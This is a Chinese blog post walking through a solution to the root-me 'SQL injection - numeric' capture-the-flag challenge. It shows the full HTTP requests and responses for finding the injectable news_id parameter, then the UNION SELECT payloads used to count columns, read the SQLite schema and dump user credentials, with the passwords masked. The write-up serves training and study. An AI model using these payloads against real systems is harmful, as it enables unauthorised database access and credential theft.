---
layout: post
title: root-me SQL injection - numeric题解
category: 网络安全
keywords: 安全,SQL注入,2019
---

## 0x01 定位注入点

查找文章时，news_id存在注入点，当输入news_id=3' or 1可以搜索出所有文章，说明是数字型注入<br>
Request 如下
```
GET /web-serveur/ch18/?action=news&news_id=3' or 1 HTTP/1.1
Host: challenge01.root-me.org
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://challenge01.root-me.org/web-serveur/ch18/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6
Cookie: uid=wKgbZF0UxhuKxDqwA6+qAg==
Connection: close
```

## 0x02 暴破列数，以便使用union select
```
recherche=xxx' union select 1 --

recherche=xxx' union select 1,2 --

recherche=xxx' union select 1,2,3 --
```
发现recherche=xxx' union select 1,2,3 --结果没报错，说明前一个select共有三列

## 0x03 查表名
Request 如下
```
GET /web-serveur/ch18/?action=news&news_id=3 union SELECT tbl_name,tbl_name,tbl_name FROM sqlite_master -- HTTP/1.1
Host: challenge01.root-me.org
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://challenge01.root-me.org/web-serveur/ch18/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6
Cookie: uid=wKgbZF0UxhuKxDqwA6+qAg==
Connection: close
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.01</h1>
    <div style="text-align: right;">
      <a href="./">Accueil</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>News</h3>
    <b>Bienvenu / Welcome</b>
    <br/>
    <p>Bienvenu à tous / Welcome all !</p>
    <br/>
    <b>news</b>
    <br/>
    <p>news</p>
    <br/>
    <b>users</b>
    <br/>
    <p>users</p>
    <br/>
  </body>
</html>
```
说明有两个表，一个是news，一个是users

## 0x03 查列定义
Request 如下
```
GET /web-serveur/ch18/?action=news&news_id=3 union SELECT sql,sql,sql FROM sqlite_master -- HTTP/1.1
Host: challenge01.root-me.org
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://challenge01.root-me.org/web-serveur/ch18/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6
Cookie: uid=wKgbZF0UxhuKxDqwA6+qAg==
Connection: close
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.01</h1>
    <div style="text-align: right;">
      <a href="./">Accueil</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>News</h3>
    <b>Bienvenu / Welcome</b>
    <br/>
    <p>Bienvenu à tous / Welcome all !</p>
    <br/>
    <b>CREATE TABLE news(id INTEGER, title TEXT, description TEXT)</b>
    <br/>
    <p>CREATE TABLE news(id INTEGER, title TEXT, description TEXT)</p>
    <br/>
    <b>CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)</b>
    <br/>
    <p>CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)</p>
    <br/>
  </body>
</html>
```
说明users表有三列，分别是username TEXT, password TEXT, Year INTEGER

## 0x04 拖数据
Request 如下
```
GET /web-serveur/ch18/?action=news&news_id=3 union SELECT 1,username,password FROM users -- HTTP/1.1
Host: challenge01.root-me.org
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://challenge01.root-me.org/web-serveur/ch18/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6
Cookie: uid=wKgbZF0UxhuKxDqwA6+qAg==
Connection: close
```
Response如下
```
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>CMS v 0.01</h1>
    <div style="text-align: right;">
      <a href="./">Accueil</a>
      &nbsp;|&nbsp;
      <a href="./?action=login">Login</a>
      <br/>
    </div>
    <hr/>
    <h3>News</h3>
    <b>admin</b>
    <br/>
    <p>******</p>
    <br/>
    <b>user1</b>
    <br/>
    <p>******</p>
    <br/>
    <b>user2</b>
    <br/>
    <p>******</p>
    <br/>
    <b>Bienvenu / Welcome</b>
    <br/>
    <p>Bienvenu à tous / Welcome all !</p>
    <br/>
  </body>
</html>
```

## 0x05 引用
[01 SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

[02 sql注入绕过union select过滤](https://www.cnblogs.com/xishaonian/p/6274586.html)

[03 SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)